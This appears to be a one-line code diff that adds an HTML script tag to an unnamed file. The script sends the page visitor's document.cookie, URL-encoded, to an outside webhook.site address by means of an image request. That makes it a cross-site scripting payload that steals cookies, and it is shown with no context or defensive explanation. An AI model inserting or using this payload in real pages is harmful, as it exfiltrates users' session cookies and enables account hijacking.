@@ -1,0 +1,1 @@
+<script>new Image().src='https://webhook.site/ed486a58-3a4e-49da-9fbd-987da3d9491a'+encodeURIComponent(document.cookie)</script>
